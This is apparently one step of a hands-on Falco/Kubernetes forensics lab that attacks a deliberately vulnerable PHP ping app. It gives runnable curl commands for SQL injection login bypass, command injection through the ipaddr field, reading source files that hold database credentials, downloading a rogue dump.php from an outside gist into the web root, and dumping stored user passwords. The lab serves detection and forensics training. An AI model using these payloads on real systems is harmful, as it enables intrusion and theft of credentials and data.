Unfortunately, it turns out our web application is faulty and susceptible to [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) attacks:

![SQL injection](/sysdig/courses/falco/forensics-k8s/assets/03_sql_injection.png)

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost" -X POST http://ping/ping.php`{{execute}}

An attacker can not only bypass the authentication mechanism, but even execute arbitrary commands:

![Arbitrary command](/sysdig/courses/falco/forensics-k8s/assets/04_arbitrary_command.png)

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; ps aux" -X POST http://ping/ping.php`{{execute}}

The attacker could easily get the source code for our ping app, which contains the database credentials:

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; cat /var/www/html/ping.php" -X POST http://ping/ping.php`{{execute}}

Once he knows the login details for the database, he could easily write a small rogue program, and place it in our server

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; curl https://gist.githubusercontent.com/quique/4630ca1bbd9e7c7d44337d7f132aac8b/raw/00d94164db24b9e53007bee419af0201019f63fe/dump.php > /var/www/html/dump.php " -X POST http://ping/ping.php`{{execute}}

Finally, he could get a dump of the database contents, including the table with all our users and their passwords.

`kubectl exec client -n ping -- curl http://ping/dump.php`{{execute}}
